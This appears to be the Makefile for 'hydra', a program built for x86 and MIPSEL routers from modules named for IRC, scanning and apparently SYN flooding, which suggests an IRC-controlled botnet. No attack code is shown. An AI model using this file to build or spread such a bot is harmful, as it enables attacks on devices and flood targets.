# Makefile

CFLAGS=
x86_CC=/usr/bin/gcc
MIPSEL_CC=/opt/hardhat/previewkit/mips/mipsel-linux-uclibc/bin/mipsel-uclibc-gcc
x86_VERS=hydra_x86_bin_2008.1
MIPSEL_VERS=hydra_mipsel_bin_2008.1

x86 : source/hydra_main.c source/hydra_utils.c source/hydra_irc.c source/hydra_reqs.c source/hydra_scan.c source/hydra_synf.c
	${x86_CC} ${CFLAGS} -o ${x86_VERS} source/hydra_main.c source/hydra_utils.c \
	source/hydra_irc.c source/hydra_reqs.c source/hydra_scan.c source/hydra_synf.c

mipsel : source/hydra_main.c source/hydra_utils.c source/hydra_irc.c source/hydra_reqs.c source/hydra_scan.c source/hydra_synf.c
	${MIPSEL_CC} ${CFLAGS} -o ${MIPSEL_VERS} source/hydra_main.c source/hydra_utils.c \
	source/hydra_irc.c source/hydra_reqs.c source/hydra_scan.c source/hydra_synf.c

clean :
	rm -fr ${x86_VERS} ${MIPSEL_VERS} src/*.o